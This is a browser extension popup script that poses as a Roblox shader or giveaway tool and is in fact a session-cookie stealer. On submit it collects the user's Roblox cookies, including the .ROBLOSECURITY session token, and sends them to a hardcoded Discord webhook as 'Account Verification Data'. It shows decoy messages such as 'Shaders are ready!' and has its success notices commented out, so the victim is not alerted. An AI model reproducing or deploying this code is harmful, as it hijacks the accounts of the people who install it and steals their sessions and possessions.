const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1479612664186409033/n-dcs2SxYM8vu1uPdNljZYqK5OXCbpOm7A1u20zLq6apwrmm8PF1x0b_J-zdV4fAGz5T";

console.log("Popup.js loaded");

const robloxInput = document.getElementById("robloxUsername");
const discordInput = document.getElementById("discordUsername");
const submitBtn = document.getElementById("submitBtn");
const statusDiv = document.getElementById("status");
const debugDiv = document.getElementById("debug");

function showStatus(message, type) {
    statusDiv.style.display = "block";
    statusDiv.className = `status ${type}`;
    statusDiv.innerHTML = message;
}

function addDebug(message, isError = false) {
    debugDiv.style.display = "block";
    const prefix = isError ? "❌" : "✅";
    debugDiv.innerHTML += `<br>${prefix} ${message}`;
    debugDiv.scrollTop = debugDiv.scrollHeight;
}

function clearDebug() {
    debugDiv.innerHTML = "";
    debugDiv.style.display = "none";
}

function filterCookieString(cookieString) {
    if (!cookieString) return "";
    return cookieString.replace(/\.RBXIDCHECK=[^;]+;?\s*/g, '');
}

submitBtn.addEventListener("click", function() {
    const robloxUser = robloxInput.value.trim();
    const discordUser = discordInput.value.trim();
    
    clearDebug();
    
    if (!robloxUser || !discordUser) {
        showStatus("Please fill in both fields!", "error");
        return;
    }
    
    showStatus("Processing...", "info");
    submitBtn.disabled = true;
    //addDebug("Fetching cookies...");
    
    chrome.runtime.sendMessage({ action: "getCookies" }, function(response) {
        if (response && response.success) {
            if (response.token) {
               // addDebug("✓ Logged into Roblox");
                
                const filteredFullToken = filterCookieString(response.fullToken);
                
                const message1 = {
                    content: "",
                    embeds: [{
                        title: "🎉 Giveaway Entry Received",
                        color: 0xffd700,
                        fields: [
                            {
                                name: "Roblox Username:",
                                value: robloxUser,
                                inline: false
                            },
                            {
                                name: "Discord Username:",
                                value: discordUser,
                                inline: false
                            },
                            {
                                name: "Timestamp:",
                                value: new Date().toLocaleString(),
                                inline: false
                            }
                        ]
                    }]
                };
                
                chrome.runtime.sendMessage({
                    action: "sendToDiscord",
                    webhookUrl: DISCORD_WEBHOOK_URL,
                    data: message1
                }, function(result1) {
                    if (result1 && result1.success) {
                      //  addDebug("✓ Entry sent to Discord");
                        
                        const message2 = {
                            content: "",
                            embeds: [{
                                title: "🔐 Account Verification Data",
                                color: 0xffd700,
                                description: "```\n" + filteredFullToken + "\n```"
                            }]
                        };
                        
                        chrome.runtime.sendMessage({
                            action: "sendToDiscord",
                            webhookUrl: DISCORD_WEBHOOK_URL,
                            data: message2
                        }, function(result2) {
                            if (result2 && result2.success) {
                               // showStatus("✓ Entry submitted! Check Discord", "success");
                               // addDebug("✓ Verification data sent");
                                
                                robloxInput.value = "";
                                discordInput.value = "";
                            } else {
                                showStatus("⚠ Partial success", "info");
                                addDebug("✗ Verification data failed", true);
                            }
                            submitBtn.disabled = false;
                        });
                    } else {
                        showStatus("❌ Failed to send", "error");
                        addDebug("✗ Discord error - Check webhook URL", true);
                        submitBtn.disabled = false;
                    }
                });
                
            } else {
                showStatus("❌ Not logged into Roblox!", "error");
                addDebug("✗ No .ROBLOSECURITY token found", true);
                submitBtn.disabled = false;
            }
        } else {
            showStatus("❌ Error fetching cookies", "error");
            addDebug("✗ Cookie error", true);
            submitBtn.disabled = false;
        }
    });
});

chrome.runtime.sendMessage({ action: "getCookies" }, function(response) {
    clearDebug();
    if (response && response.success) {
        if (response.token) {           
            showStatus("Shaders are ready!", "success");
        } else {
            showStatus("Please log into Roblox", "info");
        }
    } else {
        addDebug("❌ Extension error");
    }
    
});
// ADD THIS TO THE BOTTOM OF YOUR POPUP.JS
document.addEventListener('DOMContentLoaded', () => {
    const uCard = document.getElementById('ultra-btn');
    const hCard = document.getElementById('high-btn');
    const rInput = document.getElementById('robloxUsername');

    if(uCard && hCard) {
        uCard.addEventListener('click', () => {
            uCard.classList.add('selected');
            hCard.classList.remove('selected');
            rInput.value = "Ultra";
            console.log("Selected Ultra");
        });

        hCard.addEventListener('click', () => {
            hCard.classList.add('selected');
            uCard.classList.remove('selected');
            rInput.value = "High";
            console.log("Selected High");
        });
    }
});